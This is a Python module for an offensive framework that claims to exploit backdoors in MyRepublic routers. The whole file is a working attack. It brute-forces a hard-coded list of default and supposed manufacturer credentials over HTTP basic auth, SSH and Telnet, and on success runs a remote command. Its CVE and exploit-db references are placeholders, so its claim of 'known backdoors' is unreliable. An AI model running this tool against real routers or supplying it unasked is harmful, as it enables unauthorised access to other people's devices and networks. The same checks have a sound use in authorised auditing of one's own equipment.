#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "MyRepublic Router Backdoor Access",
    "description": "Exploits known backdoors and default credentials in MyRepublic routers",
    "author": "Lazy Framework Team",
    "license": "MIT", 
    "references": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-XXXX",
        "https://www.exploit-db.com/exploits/XXXXX"
    ],
    "platform": "multi",
    "rank": "great",
    "dependencies": ["requests", "paramiko"]
}

OPTIONS = {
    "RHOST": {
        "description": "Target router IP address",
        "required": True,
        "default": "192.168.1.1"
    },
    "RPORT": {
        "description": "Target router port",
        "required": False, 
        "default": "80"
    },
    "SSH_PORT": {
        "description": "SSH port (if different)",
        "required": False,
        "default": "22"
    },
    "TELNET_PORT": {
        "description": "Telnet port",
        "required": False,
        "default": "23"
    }
}

def run(session, options):
    import requests
    import socket
    import urllib3
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    ssh_port = int(options.get("SSH_PORT", "22"))
    telnet_port = int(options.get("TELNET_PORT", "23"))
    
    console.print(Panel.fit(
        f"[bold red]MyRepublic Router Backdoor Scanner[/bold red]\n"
        f"Target: {rhost}\n"
        f"Ports: HTTP:{rport}, SSH:{ssh_port}, Telnet:{telnet_port}",
        style="red"
    ))
    
    # Known MyRepublic router backdoor credentials
    backdoor_creds = [
        # Default credentials
        {"username": "user", "password": "user1234"},
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"username": "admin", "password": ""},
        {"username": "root", "password": "admin"},
        {"username": "root", "password": "root"},
        {"username": "support", "password": "support"},
        {"username": "user", "password": "user"},
        {"username": "guest", "password": "guest"},
        # Common backdoors
        {"username": "admin", "password": "1234"},
        {"username": "admin", "password": "12345"},
        {"username": "admin", "password": "123456"},
        {"username": "admin", "password": "default"},
        {"username": "Admin", "password": "Admin"},
        # Manufacturer backdoors
        {"username": "admin", "password": "zte"},
        {"username": "admin", "password": "Zte"},
        {"username": "admin", "password": "Huawei"},
        {"username": "admin", "password": "huawei"},
        {"username": "root", "password": "Zte521"},
        {"username": "root", "password": "hg100"},
        {"username": "user", "password": "user@123"},
    ]
    
    # Test HTTP/HTTPS backdoors
    console.print("\n[bold]Testing HTTP Backdoors...[/bold]")
    
    for protocol in ["http", "https"]:
        for creds in backdoor_creds:
            try:
                url = f"{protocol}://{rhost}:{rport}/"
                response = requests.get(url, auth=(creds["username"], creds["password"]), verify=False, timeout=5)
                
                if response.status_code == 200 and "login" not in response.text.lower():
                    console.print(f"[green]✓ HTTP Backdoor: {protocol}://{creds['username']}:{creds['password']}@{rhost}:{rport}[/green]")
                    break
                    
            except:
                continue
    
    # Test SSH backdoors
    console.print("\n[bold]Testing SSH Backdoors...[/bold]")
    
    try:
        # Check if SSH port is open
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((rhost, ssh_port))
        sock.close()
        
        if result == 0:
            console.print(f"[yellow]SSH port {ssh_port} is open[/yellow]")
            
            # Try paramiko if available
            try:
                import paramiko
                
                for creds in backdoor_creds:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(rhost, port=ssh_port, username=creds["username"], 
                                  password=creds["password"], timeout=10)
                        
                        console.print(f"[green]✓ SSH Backdoor: {creds['username']}:{creds['password']}[/green]")
                        
                        # Execute basic command
                        stdin, stdout, stderr = ssh.exec_command('uname -a')
                        output = stdout.read().decode()
                        console.print(f"[green]System Info: {output}[/green]")
                        
                        ssh.close()
                        break
                        
                    except:
                        continue
            except ImportError:
                console.print("[yellow]Paramiko not installed, skipping SSH tests[/yellow]")
                
    except Exception as e:
        console.print(f"[red]SSH test error: {str(e)}[/red]")
    
    # Test Telnet backdoors
    console.print("\n[bold]Testing Telnet Backdoors...[/bold]")
    
    try:
        import telnetlib
        
        for creds in backdoor_creds:
            try:
                tn = telnetlib.Telnet(rhost, telnet_port, timeout=10)
                
                # Wait for login prompt
                tn.read_until(b"login:", timeout=5)
                tn.write(creds["username"].encode('ascii') + b"\n")
                
                # Wait for password prompt  
                tn.read_until(b"password:", timeout=5)
                tn.write(creds["password"].encode('ascii') + b"\n")
                
                # Check if login successful
                result = tn.read_until(b"#", timeout=5)
                if b"#" in result or b"$" in result:
                    console.print(f"[green]✓ Telnet Backdoor: {creds['username']}:{creds['password']}[/green]")
                    tn.write(b"uname -a\n")
                    system_info = tn.read_until(b"#", timeout=5)
                    console.print(f"[green]System Info: {system_info.decode('utf-8', errors='ignore')}[/green]")
                    tn.close()
                    break
                    
                tn.close()
            except:
                continue
                
    except ImportError:
        console.print("[yellow]Telnetlib not available[/yellow]")
    
    console.print(Panel.fit(
        "[bold green]Backdoor scan completed[/bold green]",
        style="green"
    ))
